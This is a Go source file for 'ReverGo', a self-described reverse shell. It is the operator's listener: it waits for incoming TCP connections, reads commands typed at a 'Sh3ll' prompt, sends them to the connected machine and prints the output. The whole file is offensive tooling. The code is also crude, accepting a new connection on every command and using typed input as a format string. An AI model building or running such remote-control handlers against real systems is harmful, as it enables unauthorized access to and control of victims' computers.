//welcome to dev reverse shell in golang

package main


import (
	"fmt"
	"net"
	"bufio"
	"log"
	"github.com/fatih/color"
	"net/http"
	"io/ioutil"
	"os"
)




func Ascii() string {
	resp, err := http.Get("http://artii.herokuapp.com/make?text=ReverGo")
	if err != nil {
		log.Fatal(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}

func ReverseShell(ip string, port string) {
	
	color.Cyan("[*] Listening...")
	sock, err := net.Listen("tcp", ip+":"+port)

	if err != nil {
		log.Fatal(err)
	}

	for {
		sess, err := sock.Accept()
		if err != nil {
			log.Fatal(err)
		}
		color.Blue("[+] - Connected with success - [+]")
		//session is accepted client connected
		input := bufio.NewScanner(os.Stdin)
		
		fmt.Printf("[?] - Sh3ll: ")
		input.Scan()

		fmt.Fprintf(sess, input.Text()) // send data to client

		data, err := bufio.NewReader(sess).ReadString('\n') //recv data
		if err != nil {
			log.Fatal(err)
		}

		fmt.Printf(data) // print data


	}
}





func main() {

	color.Yellow(Ascii())
	//create listner

	if len(os.Args) == 3 {
		ReverseShell(os.Args[1], os.Args[2])
	} else {
		color.Red("[!] - Usage: go run erver.go <ip> <port> - [!]")
	}
	
	
}

